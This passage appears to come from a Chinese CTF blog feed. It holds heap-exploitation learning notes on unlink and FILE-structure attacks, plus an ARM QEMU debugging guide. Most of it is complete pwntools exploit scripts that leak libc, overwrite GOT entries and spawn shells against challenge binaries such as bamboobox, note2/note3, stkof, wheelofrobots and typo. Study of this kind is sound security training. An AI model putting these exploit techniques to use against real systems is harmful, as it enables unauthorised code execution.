0x61, #smallbin4file_size _IO_read_base = _IO_list_all_ptr-0x10, # unsorted bin attack _IO_list_all_ptr, _IO_write_base = 0, _IO_write_ptr = 1, _IO_buf_base = binsh_addr, _mode = 0, ) payload += p64(_IO_str_jumps_addr-8) payload += p64(0) # paddding payload += p64(system_addr) return payloadadd(0x10,&apos;aaaa&apos;,32,1)# gdb.attach(p)upgrade(0x40,&apos;a&apos;*0x10+p64(0)+p64(0x21)+&apos;a&apos;*0x10+p64(0)+p64(0xfa1),32,1)add(0xfb0,&apos;aaaa&apos;,32,1) #in unsorted bin listadd(0x400,&apos;b&apos;*8,32,1)# gdb.attach(p)see()p.recvuntil(&apos;b&apos;*8)main_arena = u64(p.recv(6).ljust(8,&apos;\x00&apos;)) - 1640print hex(main_arena)libc_base = main_arena - 0x3c4b20print hex(libc_base)upgrade(0x400,&apos;b&apos;*0x10,32,1)see()p.recvuntil(&apos;b&apos;*0x10)heap_addr=u64(p.recv(6).ljust(8,&apos;\x00&apos;))print hex(heap_addr)_IO_list_all = libc.symbols[&apos;_IO_list_all&apos;] + libc_basesystem = libc.symbols[&apos;system&apos;] + libc_basebinsh_addr = next(libc.search(&quot;/bin/sh&quot;)) + libc_baseIO_file_jumps_offset = libc.sym[&apos;_IO_file_jumps&apos;]IO_str_underflow_offset = libc.sym[&apos;_IO_str_underflow&apos;]for ref_offset in libc.search(p64(IO_str_underflow_offset)): possible_IO_str_jumps_offset = ref_offset - 0x20 if possible_IO_str_jumps_offset &gt; IO_file_jumps_offset: print possible_IO_str_jumps_offset break _IO_str_jumps_addr=libc_base + possible_IO_str_jumps_offsetprint hex(_IO_str_jumps_addr)pay = &apos;a&apos;*0x400+p64(0)+p64(0x21)+p32(666)+p32(0xddaa)+p64(0)file = pack_file_flush_str_jumps(_IO_str_jumps_addr,_IO_list_all,system,binsh_addr)pay+=fileupgrade(0x800,pay,32,2)gdb.attach(p)p.recvuntil(&quot;Your choice : &quot;)p.sendline(&quot;1&quot;) p.interactive() 参考链接：https://www.anquanke.com/post/id/85127https://bbs.pediy.com/thread-251195.htmhttps://www.cnblogs.com/shangye/p/6268981.htmlhttps://www.jianshu.com/p/4b0a73f321f9https://xz.aliyun.com/t/2411]]></content>
      <tags>
        <tag>pwn知识点</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[unlink]]></title>
    <url>%2F2020%2F02%2F18%2Funlink%2F</url>
    <content type="text"><![CDATA[把ctf wiki里的unlink题简单的做了一下先简单的记录一下，以后吃透了再回来好好的填填坑 理解了一下unlink的操作就是构造一个chunk，例如 123456789101112131415160x1302000: 0x0000000000000000 0x00000000000000510x1302010: 0x0000000000000000 0x0000000000000040 #fack_chunk（构造成一个free掉的样子） 0x51的chunk，就在他下面构造一个刚好可以填满这个chunk的new chunk，即-0x110x1302020: 0x00000000006030d0 0x00000000006030d80x1302030: 0x6161616161616161 0x61616161616161610x1302040: 0x6161616161616161 0x61616161616161610x1302050: 0x0000000000000040 0x00000000000000a0 #p位改成0，free下一个chunk之后会与上一个chunk合并0x1302060: 0x654420746f626f52 0x00000000006c69760x1302070: 0x0000000000000000 0x00000000000000000x1302080: 0x0000000000000000 0x00000000000000000x1302090: 0x0000000000000000 0x00000000000000000x13020a0: 0x0000000000000000 0x00000000000000000x13020b0: 0x0000000000000000 0x00000000000000000x13020c0: 0x0000000000000000 0x00000000000000000x13020d0: 0x0000000000000000 0x00000000000000000x13020e0: 0x0000000000000000 0x00000000000000000x13020f0: 0x0000000000000000 0x0000000000020f11 Hitcon-training lab11 bambooboxunlink的很重要一个条件就是已知存储各个堆块地址的位置。 unlink操作： 123456789101112131415161718add(0x80,'aaaaaa') #chunk0add(0x80,'bbbbbb') #chunk1add(0x80,'cccccc') #chunk2target = 0x6020c8fd = target - 0x18bk = target - 0x10# fack chunk（构造成被free掉的样子pay = p64(0) + p64(0x81) pay += p64(fd)pay += p64(bk)pay += 'a'*0x60pay += p64(0x80)+p64(0x90)# gdb.attach(r)modify(0,0x90,pay)remove(1) #free chunk1，使chunk1往前合并,触发unlink 则chunk0就变成了发错fack_chunk里面的fd和bk，所指向的target改target的内容为我们想覆写的一个got表地址，这样show的时候也可以leak出libc来 1234567891011payload = '\x00'*0x10+ p64(0x80) + p64(0x602068) #把atoi的got表地址覆写成chunk0里面modify(0,0x60,payload)show()r.recvuntil("0 : ") atoi_addr = u64(r.recv(6).ljust(8,"\x00")) print hex(atio_addr)libc_base=atoi_addr-0x36E80print hex(libc_base)one_gadget = libc_base + 0xf02a4modify(0,0x8,p64(one_gadget)) #把atoi got表里的内容改为one gadget 完整exp： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import *context.log_level ='DEBUG'libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")r=process('./bamboobox')elf=ELF('./bamboobox')# r = remote(host,port)def add(length,name): r.recvuntil(":") r.sendline("2") r.recvuntil("Please enter the length of item name:") r.sendline(str(length)) r.recvuntil(":") r.sendline(name)def modify(idx,length,name): r.recvuntil("Your choice:") r.sendline("3") r.recvuntil(":") r.sendline(str(idx)) r.recvuntil(":") r.sendline(str(length)) r.recvuntil(":") r.sendline(name)def remove(idx): r.recvuntil(":") r.sendline("4") r.recvuntil("Please enter the index of item:") r.sendline(str(idx))def show(): r.recvuntil(":") r.sendline("1") add(0x80,'aaaaaa')add(0x80,'bbbbbb')add(0x80,'cccccc')target = 0x6020c8fd = target - 0x18bk = target - 0x10# pay ='a'*0x10pay = p64(0) + p64(0x81) pay += p64(fd)pay += p64(bk)pay += 'a'*0x60pay += p64(0x80)+p64(0x90)# gdb.attach(r)modify(0,0x90,pay)remove(1)payload = '\x00'*0x10+ p64(0x80) + p64(0x602068)modify(0,0x60,payload)show()# r.recv()r.recvuntil("0 : ")atoi_addr = u64(r.recv(6).ljust(8,"\x00"))print hex(atoi_addr)libc_base=atio_addr-0x36E80print hex(libc_base)one_gadget = libc_base + 0xf02a4system = libc_base + 0x45390# r.recv()# modify(0,0x8,p64(system))modify(0,0x8,p64(one_gadget))# r.recvuntil(":")# r.sendline("$0")r.interactive() 2016 ZCTF note2unlink来说就是构造一个fack_chunk（为free完的样子）如果可以overlap的话，直接写在下一个chunk的top，size的p位为0，如果不可以的overlap的话，就是这题一样，利用两个chunk来构造一个fack_chunk，free掉fack_chunk后面那个chunk，使之合并，触发unlink。 和lab11差不多的方法 exp: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import *context.log_level ='DEBUG'libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")p = process('./note2')elf = ELF('./note2')def add(length, content): p.recvuntil('option---&gt;&gt;') p.sendline('1') p.recvuntil('(less than 128)') p.sendline(str(length)) p.recvuntil('content:') p.sendline(content)def show(id): p.recvuntil('option---&gt;&gt;') p.sendline('2') p.recvuntil('note:') p.sendline(str(id))def edit(id, choice, s): p.recvuntil('option---&gt;&gt;') p.sendline('3') p.recvuntil('note:') p.sendline(str(id)) p.recvuntil('2.append]') p.sendline(str(choice)) p.sendline(s)def free(id): p.recvuntil('option---&gt;&gt;') p.sendline('4') p.recvuntil('note:') p.sendline(str(id))p.recvuntil("Input your name:\n")p.sendline("aaaa")p.recvuntil("Input your address:\n")p.sendline("bbbb")target = 0x602120#prtfd = target - 0x18bk = target -0x10payload = p64(0)+p64(0x60)payload += p64(fd)+p64(bk)payload += 'a'*0x20add(0x40,payload)#0add(0,'bbbb')#1add(0x80,'cccc')#2free(1)gdb.attach(p)payload1='a'*0x10payload1+=p64(0x60)+p64(0x90)add(0,payload1)#1free(2)atoi=elf.got['atoi']payload2 ='a'*0x18+p64(atoi)#prt-0x18 startedit(0,1,payload2)#0show(0)p.recvuntil('is ')atoi_addr = u64(p.recvuntil("\n",drop=True).ljust(8,"\00"))offset_addr=atoi_addr-libc.sym['atoi']print hex(offset_addr)print hex(atoi_addr)one_gadget=offset_addr+0xf1147edit(0,1,p64(one_gadget))p.sendline('\n')p.interactive() 2016 zctf note3和note2比，它就少了个show，但是我们可以利用puts函数来leak就有就往fack_chunk里面写入free和puts两个函数的got值的操作，leak puts exp： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import *context.log_level ='DEBUG'sh=process('./note3')# sh=remote('127.0.0.1',9999)elf=ELF('./note3')libc=ELF('/lib/x86_64-linux-gnu/libc.so.6') def add(size,content): sh.recvuntil('&gt;&gt;\n') sh.sendline('1') sh.recvuntil('1024)\n') sh.sendline(str(size)) sh.recvuntil('content:\n') sh.sendline(content)def edit(index,content): sh.recvuntil('&gt;&gt;\n') sh.sendline('3') sh.recvuntil('note:\n') sh.sendline(str(index)) sh.recvuntil('ent:\n') sh.sendline(content)def delete(index): sh.recvuntil('&gt;&gt;\n') sh.sendline('4') sh.recvuntil('note:\n') sh.sendline(str(index))target = 0x6020c8#prtfd = target - 0x18bk = target -0x10payload = p64(0)+p64(0x60)payload += p64(fd)+p64(bk)payload += 'a'*0x20add(0x40,payload)#0add(0,'bbbb')#1add(0x80,'cccc')#2delete(1)# gdb.attach(sh)payload1='a'*0x10payload1+=p64(0x60)+p64(0x90)add(0,payload1)#1delete(2)free=elf.got['free']put_gots = elf.got['puts']payload2 ='a'*0x18 + p64(free) + p64(put_gots)#prt-0x18 startedit(0,payload2)#0puts_plt = elf.sym['puts']edit(0,p64(puts_plt)[:-1]) # 解决了只能包含“\n”只能发送八个字节的问题delete(1)puts_addr = u64(sh.recvuntil("\nDelete success\n",drop=True).ljust(8,"\00"))print hex(puts_addr)libc_base = puts_addr - libc.sym['puts']print hex(libc_base)one_gadget = libc_base + 0xf1147edit(0,p64(one_gadget)[:-1])gdb.attach(sh)# add(0x88,'aaaa')delete(0)sh.interactive() 另一种方法，是用了edit里面id的整数溢出，用复数使chunk可以直接overlap然后改free的got为system（这个是把chunk0覆写成free got的地址，再edit一次0，就可以写system写进got表），再把binsh的地址写在原本是chunk0地址的地方，free的时候，拿chunk0当参数就可以实现system(‘/bin/sh’)（one_gadget其实更方便一点） 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import *context.log_level ='DEBUG'sh=process('./note3')# sh=remote('127.0.0.1',9999)elf=ELF('./note3')libc=ELF('/lib/x86_64-linux-gnu/libc.so.6') def newnote(size,content): sh.recvuntil('&gt;&gt;\n') sh.sendline('1') sh.recvuntil('1024)\n') sh.sendline(str(size)) sh.recvuntil('content:\n') sh.sendline(content)def editnote(index,content): sh.recvuntil('&gt;&gt;\n') sh.sendline('3') sh.recvuntil('note:\n') sh.sendline(str(index)) sh.recvuntil('ent:\n') sh.sendline(content)def delnote(index): sh.recvuntil('&gt;&gt;\n') sh.sendline('4') sh.recvuntil('note:\n') sh.sendline(str(index))newnote(0x80,'aaaaaa')newnote(0x80,'aaaaaa')newnote(0x80,'aaaaaa')newnote(0x80,'aaaaaa')newnote(0x80,'aaaaaa')newnote(0x80,'aaaaaa')newnote(0x80,'/bin/sh')inter=-9223372036854775808payload=p64(0)payload+=p64(0x81)payload+=p64(0x6020e0-0x18)payload+=p64(0x6020e0-0x10)payload=payload.ljust(0x80,'a')payload+=p64(0x80)payload+=p64(0x90)gdb.attach(sh)editnote(3,'a')editnote(inter,payload) #editnote(-1,payload) 此時size為note6地址 改的是chunk3delnote(4)free_got=elf.got['free']puts_plt=elf.plt['puts']atol_got=elf.got['atol']puts_got=elf.got['puts']editnote(3,p64(free_got)+p64(puts_got))editnote(0,p64(puts_plt)[:-1])delnote(1)puts_adr=sh.recvuntil('\nDelete success\n',drop=True).ljust(8,'\x00')puts_adr=u64(puts_adr)print 'puts_adr: '+hex(puts_adr) libc_base=puts_adr-libc.symbols['puts']sys_adr=libc_base+libc.symbols['system']binsh_adr=libc_base+libc.search('/bin/sh').next()print 'libc_base: '+hex(libc_base)print 'sys_adr: '+hex(sys_adr)print 'binsh_adr: '+hex(binsh_adr)editnote(0,p64(sys_adr)[:-1])editnote(3,p64(binsh_adr)[:-1]) #作为chunk0,即free的参数delnote(0)sh.interactive() 学到的新技能 1p64(puts_plt)[:-1] # 解决了只能包含“\n”只能发送八个字节的问题 2014 hitcon stkof这题我一直绕的点在，target为什么要是chunk0+0x10，即chunk2的位置在测试中，我们可以发现其实chunk1和chunk2之间是隔了0x400的，但chunk2和chunk3是相邻的我们需要在chunk2中操作unlink，所以我们需要是 chunk2 --&gt;fack_chunk(chunk2-0x18),所以target改为chunk2地址所在的位置（在何位置构造，指针则指向哪里） 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768#!usr/bin/env python# -*- coding:utf-8 -*- from pwn import* context.log_level ='DEBUG' sh = process("./stkof")elf = ELF("./stkof")libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') def add(size): sh.sendline("1") sh.sendline(str(size)) sh.recvuntil("OK\n") def delete(idx): sh.sendline("3") sh.sendline(str(idx)) def edit(idx,strings): sh.sendline("2") sh.sendline(str(idx)) sh.sendline(str(len(strings))) sh.send(strings) sh.recvuntil("OK\n")free_got = elf.got['free']puts_got = elf.got['puts']puts_plt = elf.sym['puts']add(0x80) #1add(0x80) #2add(0x80) #3target = 0x602140 + 0x10fd = target - 0x18bk = target - 0x10payload = p64(0)+p64(0x81)payload += p64(fd) +p64(bk)payload += 'a'*0x60payload += p64(0x80)+p64(0x90)gdb.attach(sh)edit(2,payload) #在chunk2的地方修改，则要使fack指向全局指针存放chunk2处的地址，而非chunk0delete(3)sh.recvuntil("OK")payload = 'a'*0x8 + p64(free_got) + p64(puts_got)edit(2,payload)edit(0,p64(puts_plt))delete(1)puts_addr = u64(sh.recvuntil('\nOK\n', drop=True).ljust(8, '\x00'))libc_base = puts_addr - libc.sym['puts']print hex(puts_addr)print hex(libc_base)onegadget = libc_base + 0xf1147edit(0,p64(onegadget))delete(0)sh.interactive() 2017 wheelofrobots这道题太混乱了，好复杂的一个程序啊，我看了老半天才稍微看懂这个程序是干嘛的 洞的话第一个应该是add里面choose之后输入那里 off by one 123456789101112131415161718192021222324252627sub_400D83("Which robot do you want to add to the wheel?");printf("Your choice :");memset(&amp;unk_603110, 0, 4uLL);v10 = sub_400A36(&amp;unk_603110, 5LL); //可以多一个字节溢出，覆盖的地址在0x603114的内容而0x603114刚好是存放第二个robot状态的地址 case 2: if ( !dword_603114 ) &#123; printf("Increase Bender's intelligence: ", 5LL); memset(&amp;s, 0, 5uLL); v8 = sub_400A36(&amp;s, 5LL); if ( v8 &gt; 4 ) &#123; puts("Sorry impossible to make bender as smart!"); v8 = 2; &#125; qword_6030F0 = calloc(1uLL, 20 * v8); qword_603138 = v8; dword_603114 = 1; v1 = qword_6030F0; *(_DWORD *)qword_6030F0 = 'dneB'; v1[2] = 're'; *((_BYTE *)v1 + 6) = 0; ++qword_603130; &#125; break; 我们可以通过更改bender的状态做到不add直接change然后我们可以发现这几个robots之间错综复杂的关系，就可以构造face_chunk,实现unlink 12345678910111213141516171819202122case 1u: result = (unsigned int)dword_603120; if ( dword_603120 ) &#123; puts("Robot's name: "); result = read(0, buf, 0x14uLL); &#125; break; .bss:00000000006030F8 ; void *buf.bss:00000000006030F8 buf dq ? ; DATA XREF: sub_400DF8+A6↑w.bss:00000000006030F8 ; sub_400DF8+B7↑r ... case 6u: result = (unsigned int)dword_60311C; if ( dword_60311C ) &#123; puts("Robot's name: "); result = read(0, qword_6030E8, 20 * qword_603148); &#125; break; 我们知道如果在tinny处改size就可以覆盖destruction的内容，构造unlink，先在bss段构造fack_chunk，使原本指向tinny，即chunk1的指针，指向0x603148处，之后对chunk1的所有操作都在这个地址处 1234567891011pwndbg&gt; x/40gx 0x6030e00x6030e0: 0x0000000000000000 0x00000000000000000x6030f0: 0x0000000001021010 0x0000000000603148 -&gt;tinny point to 0x6031480x603100: 0x0000000001021030 0x00000000000000000x603110: 0x0000000100000a31 0x00000000000000000x603120: 0x0000000100000001 0x00000000000000000x603130: 0x0000000000000003 0x00000000000000010x603140: 0x0000000000000020 -&gt; fack_chunk 0x695420796e6e69540x603150: 0x000000000000006d 0x00000000000000000x603160: 0x0000000000000000 0x00000000000000000x603170: 0x0000000000000000 0x0000000000000000 利用chunk1和chunk6的关系，在chunk6上构造unlink，使unlink到0x6030e8-0x18处，就可以覆写该存放chunk地址为自己想改写的东西。 wiki具体exp： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154from pwn import *context.terminal = ['gnome-terminal', '-x', 'sh', '-c']if args['DEBUG']: context.log_level = 'debug'context.binary = "./wheelofrobots"robots = ELF('./wheelofrobots')if args['REMOTE']: p = remote('127.0.0.1', 7777)else: p = process("./wheelofrobots")log.info('PID: ' + str(proc.pidof(p)[0]))libc = ELF('./libc.so.6')context.log_level = 'debug'def offset_bin_main_arena(idx): word_bytes = context.word_size / 8 offset = 4 # lock offset += 4 # flags offset += word_bytes * 10 # offset fastbin offset += word_bytes * 2 # top,last_remainder offset += idx * 2 * word_bytes # idx offset -= word_bytes * 2 # bin overlap return offsetdef add(idx, size=0): p.recvuntil('Your choice :') p.sendline('1') p.recvuntil('Your choice :') p.sendline(str(idx)) if idx == 2: p.recvuntil("Increase Bender's intelligence: ") p.sendline(str(size)) elif idx == 3: p.recvuntil("Increase Robot Devil's cruelty: ") p.sendline(str(size)) elif idx == 6: p.recvuntil("Increase Destructor's powerful: ") p.sendline(str(size))def remove(idx): p.recvuntil('Your choice :') p.sendline('2') p.recvuntil('Your choice :') p.sendline(str(idx))def change(idx, name): p.recvuntil('Your choice :') p.sendline('3') p.recvuntil('Your choice :') p.sendline(str(idx)) p.recvuntil("Robot's name: \n") p.send(name)def start_robot(): p.recvuntil('Your choice :') p.sendline('4')def overflow_benderinuse(inuse): p.recvuntil('Your choice :') p.sendline('1') p.recvuntil('Your choice :') p.send('9999' + inuse)def write(where, what): change(1, p64(where)) change(6, p64(what))def exp(): print "step 1" # add a fastbin chunk 0x20 and free it # so it is in fastbin, idx2-&gt;NULL add(2, 1) # idx2 remove(2) gdb.attach(p) # overflow bender inuse with 1 overflow_benderinuse('\x01') # change bender's fd to 0x603138, point to bender's size # now fastbin 0x20, idx2-&gt;0x603138-&gt;NULL change(2, p64(0x603138)) # in order add bender again overflow_benderinuse('\x00') # add bender again, fastbin 0x603138-&gt;NULL add(2, 1) # in order to malloc chunk at 0x603138 # we need to bypass the fastbin size check, i.e. set *0x603140=0x20 # it is at Robot Devil add(3, 0x20) #构造个size，使add tinny的时候指向0x603148，同时把它写进0x3060f8 # trigger malloc, set tinny point to 0x603148 add(1) # wheels must &lt;= 3 remove(2) remove(3) print 'step 2' # alloc Destructor size 60-&gt;0x50, chunk content 0x40 add(6, 3) # alloc devil, size=20*7=140, bigger than fastbin add(3, 7) # edit destructor's size to 1000 by tinny change(1, p64(1000)) # place fake chunk at destructor's pointer fakechunk_addr = 0x6030E8 fakechunk = p64(0) + p64(0x20) + p64(fakechunk_addr - 0x18) + p64(fakechunk_addr - 0x10) + p64(0x20) fakechunk = fakechunk.ljust(0x40, 'a') fakechunk += p64(0x40) + p64(0xa0) change(6, fakechunk) #写在heap里 # trigger unlink remove(3) print 'step 3' # make 0x6030F8 point to 0x6030E8 payload = p64(0) * 2 + 0x18 * 'a' + p64(0x6030E8) change(6, payload) print 'step 4' # make exit just as return write(robots.got['exit'], 0x401954) print 'step 5' # set wheel cnt =3, 0x603130 in order to start robot write(0x603130, 3) # set destructor point to puts@got change(1, p64(robots.got['puts'])) start_robot() #start chunk1，即puts p.recvuntil('New hands great!! Thx ') puts_addr = p.recvuntil('!\n', drop=True).ljust(8, '\x00') puts_addr = u64(puts_addr) log.success('puts addr: ' + hex(puts_addr)) libc_base = puts_addr - libc.symbols['puts'] log.success('libc base: ' + hex(libc_base)) system_addr = libc_base + libc.symbols['system'] binsh_addr = libc_base + next(libc.search('/bin/sh')) # make free-&gt;system write(robots.got['free'], system_addr) # make destructor point to /bin/sh addr write(0x6030E8, binsh_addr) # get shell remove(6) p.interactive() passif __name__ == "__main__": exp() emmm这种方法在start robots那里我就很懵，简便一点的话就换一种方法来leak，直接覆写chunk1和chunk2，通过改free的got表来实现exp： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697#!usr/bin/env python# -*- coding:utf-8 -*- from pwn import* context.log_level ='DEBUG'elf = ELF('./wheelofrobots')p = process("./wheelofrobots")libc = ELF('./libc.so.6')def add(idx, size=0): p.recvuntil('Your choice :') p.sendline('1') p.recvuntil('Your choice :') p.sendline(str(idx)) if idx == 2: p.recvuntil("Increase Bender's intelligence: ") p.sendline(str(size)) elif idx == 3: p.recvuntil("Increase Robot Devil's cruelty: ") p.sendline(str(size)) elif idx == 6: p.recvuntil("Increase Destructor's powerful: ") p.sendline(str(size))def remove(idx): p.recvuntil('Your choice :') p.sendline('2') p.recvuntil('Your choice :') p.sendline(str(idx))def change(idx, name): p.recvuntil('Your choice :') p.sendline('3') p.recvuntil('Your choice :') p.sendline(str(idx)) p.recvuntil("Robot's name: \n") p.send(name)def start_robot(): p.recvuntil('Your choice :') p.sendline('4')def overflow_benderinuse(inuse): p.recvuntil('Your choice :') p.sendline('1') p.recvuntil('Your choice :') p.send('9999' + inuse)def write(where, what): change(1, p64(where)) change(6, p64(what))add(2,1)remove(2)overflow_benderinuse('\x01')change(2,p64(0x603138))overflow_benderinuse('\x00')add(2,1)add(3,0x20)add(1)remove(2)remove(3)add(6,3) #60-&gt;0x40add(3,7) #140-&gt;0x90change(1,p64(1000)) #改大小方便填写payloadtarget = 0x6030e8fd = target-0x18bk = target-0x10pay = p64(0)+p64(0x40)+p64(fd) + p64(bk) +'a'*0x20+p64(0x40)+p64(0xa0)change(6,pay)remove(3) #unlink# gdb.attach(p)add(2,1)pay = 'a'*0x18 +p64(elf.got['free'])+p64(elf.got['puts'])change(6,pay)pay = p64(elf.plt['puts'])change(6,pay)remove(2)puts_addr = u64(p.recv(6).ljust(8,'\x00'))print hex(puts_addr)libc_base = puts_addr - libc.sym['puts']print hex(libc_base)system = libc_base + libc.sym['system']change(6,p64(system))change(1,"/bin/sh")p.interactive() 参考链接：https://www.jianshu.com/p/b5ce1e4aee6ahttps://gdufs-king.github.io/2020/01/03/unlink%E5%88%9D%E6%8E%A2/]]></content>
      <tags>
        <tag>pwn知识点</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[arm的环境搭建+简单的例题]]></title>
    <url>%2F2020%2F02%2F07%2Farm%E7%9A%84%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA-%E7%AE%80%E5%8D%95%E7%9A%84%E4%BE%8B%E9%A2%98%2F</url>
    <content type="text"><![CDATA[关于arm的东西我好像已经拖了将近一个月了，不能再拖下去了，先记一些吧，之后我陆续补坑看看 arm环境搭建1234567891011121314#安装qemuapt-get install qemu#更新一下sudo apt-get update#安装32位的依赖库sudo apt-get install -y gcc-arm-linux-gnueabi#运行32位的动态链接程序方法qemu-arm -L /usr/arm-linux-gnueabi ./文件#安装64位的依赖库sudo apt-get install -y gcc-aarch64-linux-gnu g++-aarch64-linux-gnu#运行64位的动态链接程序方法qemu-aarch64 -L /usr/aarch64-linux-gnu ./文件#安装gdb调试工具sudo apt-get install git gdb gdb-multiarch 32位的调试步骤：1234567891011#运行32位的动态链接程序方法qemu-arm -L /usr/arm-linux-gnueabi ./文件#32位程序下断调试步骤1： qemu-arm -g 1234 -L /usr/arm-linux-gnueabi ./文件(窗口1)2： qemu-arm-static -g 1234 ./文件（窗口1）gdb-multiarch ./文件(窗口2)pwndbg&gt; target remote :1234pwndbg&gt; b *0x8bb0pwndbg&gt; c 64位的调试步骤：12345678#运行64位的动态链接程序方法qemu-aarch64 -L /usr/aarch64-linux-gnu ./文件#64位程序下断调试步骤qemu-aarch64 -g 1234 -L /usr/aarch64-linux-gnu ./文件(窗口1)gdb-multiarch ./文件(窗口2)pwndbg&gt; target remote :1234pwndbg&gt; b *0x8bb0pwndbg&gt; c 起qemu的那个虚拟机（上面那些命令行好像更方便一点，这个的话可能每次打题都要起一次） 1sudo qemu-system-arm -M vexpress-a9 -kernel vmlinuz-3.2.0-4-vexpress -initrd initrd.img-3.2.0-4-vexpress -drive if=sd,file=debian_wheezy_armhf_standard.qcow2 -append &quot;root=/dev/mmcblk0p2 console=ttyAMA0&quot; -net nic,macaddr=52:54:00:12:34:56 -net tap -nographic 架构下的寄存器64位的寄存器123456789x0~x7：传递子程序的参数和返回值，使用时不需要保存，多余的参数用堆栈传递，64位的返回结果保存在x0中。x8：用于保存子程序的返回地址，使用时不需要保存。x9~x15：临时寄存器，也叫可变寄存器，子程序使用时不需要保存。x16~x17：子程序内部调用寄存器（IPx），使用时不需要保存，尽量不要使用。x18：平台寄存器，它的使用与平台相关，尽量不要使用。x19~x28：临时寄存器，子程序使用时必须保存。x29：帧指针寄存器（FP），用于连接栈帧，使用时必须保存。x30：链接寄存器（LR），用于保存子程序的返回地址。x31：堆栈指针寄存器（SP），用于指向每个函数的栈顶。 32位的寄存器123456r0-r3: 用于函数调用入参，32位最多支持4个入参，当多于4个入参是将通过压栈方式进行传递。栈的方式为先进后出，估参数大于4个时 入栈顺序与参数顺序正好相反，子程序返回前无需回复R0~R3的值,32位的返回结果保存在r0中。r4-r11: 用于保存局部变量。函数进入后首先第一件事就是将R4~R11入栈保存(看局部变量用了多少个，不一定所有都需要入栈)，然后才能用于本函数使用，本函数使用完之后，要将之前栈保存的数据恢复到R4~R11中r7: 系统调用时，存放系统调用号，有时也用于作为FP使用。FP又叫frame pointer即栈基指针，主要在函数中保存当前函数的栈起始位置，用于堆栈回溯。r13: SP，即栈指针寄存器，主要用于指向当前程序栈顶，配合指令pop/push等。r14: LR，即链接寄存器，主要用于存放函数的返回地址，即当前函数返回时，知道自己该回到哪儿去继续运行。r15: PC，即程序寄存器，主要用于存放CPU取指的地址。是取值地址，不是当前运行地址。 arm的简单例题32位简单的armtypo就是道很简单的ret2text用命令行先连上qume和gdb，让它跑起来 然后就可以调了我们在gdb里生成字符串，自己输的话，计算长度可能会出bug调出长度之后就去找程序有没有system(‘/bin/sh’)这个东西去了函数符号表，我不会那个rizzo的恢复，所以直接找字符’/bin/sh’ 会发现它在一个函数里这个长得就很像execve，f5进去看一下 然后这个名字就很像了，再加上系统调用号也出来了（经大佬指点才知道arm32中系统调用号是在r7里的）点开汇编，发现它确实是然后我们就用syscall来做这题吧syscall要用的话，肯定是要r1、 r2的参数都得为null的所以我们去找gadgetr0的就只有一个，然后还有相关的r1和r7都能对应找到唯独发现没有pop r2的gadget，所以我们考虑一下xor或者是mov（xor好像在arm里没有）这里面对r2有赋值为零的gadget，我们可以用一波，但事实它还自带三个pop，为了堆栈平衡，我们就还得填充三个0差不多就可以写exp了 1234567891011121314151617181920212223242526272829303132333435#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import *import syscontext.log_level = &quot;debug&quot;if sys.argv[1] == &quot;l&quot;: io = process(&quot;./typo&quot;, timeout = 2)elif sys.argv[1] == &quot;d&quot;: io = process([&quot;qemu-arm&quot;, &quot;-g&quot;, &quot;1234&quot;, &quot;./typo&quot;])else: io = remote(&quot;pwn2.jarvisoj.com&quot;, 9888, timeout = 2)mov_r2 = 0x0004df00 #mov r2, #0 ; mov r0, r2 ; pop &#123;r3, r4, r5, pc&#125;syscall = 0x0002165Cpop_r3_r7 =0x0000a958pop_r0_r4 = 0x00020904 #pop &#123;r0, r4, pc&#125;pop_r1 = 0x00068becpop_r7 = 0x00014068#0x00008160binsh = 0x0006c384payload = &apos;a&apos;*112 payload += p32(mov_r2)payload += p32(0)+p32(0)+p32(0)payload += p32(pop_r0_r4)payload += p32(binsh)+p32(0)payload += p32(pop_r7)+p32(0xb)payload += p32(pop_r1)+p32(0)payload += p32(syscall)# r0-&gt;binsh r1,r2-&gt;0 arm的系统调用号存在r7# io.sendline(&apos;\n&apos;)io.sendlineafter(&quot;if you want to quit\n&quot;, &apos;\n&apos;)io.sendline(payload)io.interactive() 然后我碰到一个很难受的bug，本地加了context.log_level = “debug”是能跑通的，但是不加就不行了，为啥呢，害，到时候再探究探究 melong（arm32位）这题是个 简单的栈题，我被难倒的地方是offset到底是什么这题的栈溢出存在于write那个函数里的read用-1绕过len，使我们可以输入很多的东西，可以构造rop链write函数里面长这样，我们到出去看a2是什么发现是v4，去找他的偏移，发现是0x54，就一般在我的印象里，偏移应该是ebp+0x54，所以应该再加一个4的，但是看了很多exp都是用的0x54 发现我们需要覆盖到dd4的地方 r11（d14-&gt;exid即下一个函数的地址存放处）而开始覆盖是在d80，offset为84 即 0x54（但是我并没有在ida里找到那段代码）这个是我写入100个字符之后，触发exit之后报错之后，计算出来的 偏移，就是0x54，这题也确实比较独特，ida里的偏移果然不一定是对的 然后用put的方法leak的话呢，本来以为会比较快捷方便一点，但是这里最想不到的是，进入了puts函数之后，结尾时会否存在pop，pc又在哪里赋值，在傻傻地用正常栈的方法试了一遍发现不行，选择跟进去看看puts里面的玄机 发现在末尾它有一个pop所以要想回到主函数还要填充些值进寄存器里 exp大概就如下了： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768#!/usr/bin/python# -*- coding: utf-8 -*-from pwn import *context.log_level 